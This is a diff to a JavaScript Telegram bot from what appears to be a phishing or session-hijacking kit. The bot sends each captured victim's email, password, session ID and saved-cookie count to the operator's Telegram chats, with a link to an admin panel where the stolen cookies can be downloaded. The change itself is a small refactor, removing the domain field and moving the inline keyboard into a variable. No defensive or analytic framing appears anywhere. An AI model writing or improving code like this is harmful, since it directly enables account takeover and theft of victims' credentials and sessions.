@@ -268,7 +268,7 @@ ${adminUrl}
             return;
         }
 
-        const { email, domain, timestamp, totalCookies, sessionId, password } = loginData;
+        const { email, timestamp, totalCookies, sessionId, password } = loginData;
         const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
 
         const notificationMessage = `
@@ -276,7 +276,6 @@ ${adminUrl}
 
 📧 <b>Email:</b> <code>${email}</code>
 🔑 <b>Password:</b> <span class="tg-spoiler">${password || 'Not captured'}</span>
-🏢 <b>Domain:</b> <code>${domain}</code>
 🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
 📊 <b>Cookies:</b> ${totalCookies} saved
 🆔 <b>Session:</b> ${sessionId}
@@ -284,17 +283,18 @@ ${adminUrl}
 🌐 Access admin panel to view details and download cookies
         `;
 
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '🌐 Open Admin Panel', url: adminUrl }]
+            ]
+        };
+
         // Send notification to all subscribed users
         for (const chatId of this.chatIds) {
             try {
                 await this.bot.sendMessage(chatId, notificationMessage, {
                     parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '🌐 Open Admin Panel', url: adminUrl }],
-                            [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
-                        ]
-                    }
+                    reply_markup: keyboard
                 });
             } catch (error) {
                 console.error(`Failed to send notification to ${chatId}:`, error.message);
